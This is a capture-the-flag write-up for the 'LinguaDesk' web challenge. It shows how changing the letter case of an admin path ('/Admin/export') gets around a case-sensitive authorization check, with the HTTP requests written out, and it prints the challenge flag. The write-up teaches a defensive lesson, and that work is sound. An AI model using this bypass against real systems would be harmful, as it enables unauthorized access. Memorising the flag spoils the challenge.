---
title: "LinguaDesk — Flagyard WEB CTF Write-up"
platform: Flagyard
category: WEB
difficulty: Easy
---

# LinguaDesk — CTF Write-up

## Challenge Information
- **Name:** LinguaDesk
- **Platform:** Flagyard
- **Category:** WEB
- **Difficulty:** Easy

## Challenge Overview
LinguaDesk is the employee portal for a three-language desk: English, Arabic, and French. Weekly archive exports are strictly reserved for platform administrators. However, the provided account (`lina.farouk`) is just a standard employee. 

The objective is to find a way to bypass these access controls, reach the administrator export function, and retrieve the flag.

**Provided Credentials:**
- **Username:** `lina.farouk`
- **Password:** `desk-4419`
- **Role:** Employee

## Reconnaissance
After logging into the application using the provided credentials, the dashboard confirms that the account holds standard employee privileges and explicitly states that archive exports are restricted to administrators.

Attempting to access the export endpoint directly yields the following:

**Request:**
```http
GET /admin/export HTTP/1.1
Host: [CHALLENGE_HOST]
```

**Response:**
```http
HTTP/1.1 403 Forbidden
```
This confirms that an authorization mechanism is actively blocking standard users from accessing the `/admin/export` directory.

## Solution Steps

### Step 1: Bypassing Authorization via Case Manipulation
Given that the standard `/admin/export` route returns a `403 Forbidden`, the next step is to test how the server handles case sensitivity. Sometimes, routing mechanisms and authorization middlewares process URLs differently.

By changing the first letter of the directory to uppercase, we send a new request:

**Request:**
```http
GET /Admin/export HTTP/1.1
Host: [CHALLENGE_HOST]
```

**Response:**
```http
HTTP/1.1 200 OK
```
The server responds successfully, bypassing the `403` restriction. It returns a JSON array listing the available exports, which includes an entry named `weekly-backup`.

### Step 2: Retrieving Export Details
Now that we have bypassed the access control, we can append the discovered backup name to our manipulated path to see its contents.

**Request:**
```http
GET /Admin/export/weekly-backup HTTP/1.1
Host: [CHALLENGE_HOST]
```

**Response:**
```json
{
  "filename": "weekly-backup.json",
  "download": "/internal/files/export_93ac.json"
}
```
The server successfully returns the internal path where the backup file is stored.

### Step 3: Downloading the Flag
Using the internal download path discovered in the previous step, we can directly request the backup file.

**Request:**
```http
GET /internal/files/export_93ac.json HTTP/1.1
Host: [CHALLENGE_HOST]
```

**Response:**
```http
HTTP/1.1 200 OK
```
The file downloads successfully, and inspecting its contents reveals the hidden flag.

## Flag
`FlagY{7d16a9824efdecfa8f425f33b2d1a052}`

## Root Cause & Lessons Learned

**Root Cause:**
The vulnerability stems from **Broken Access Control** due to **Inconsistent Route Handling**. The application relies on two separate mechanisms that do not agree on case sensitivity. The authorization middleware checking permissions is strictly *case-sensitive* (blocking exactly `/admin/export`), while the backend routing engine is *case-insensitive* (serving the admin page even if requested as `/Admin/export`). Changing the case allows the request to slip past the security filter while still being processed correctly by the router.

**Lessons Learned:**
- **Always test case variations:** When encountering a `403 Forbidden` on an interesting endpoint, testing variations like uppercase letters, trailing slashes (`/admin/export/`), or URL encoding is a highly effective methodology.
- **Defense in Depth:** Security checks should not rely purely on string matching the request URL path. Verification should be tied directly to the resource being accessed and the authenticated user's session role on every single request.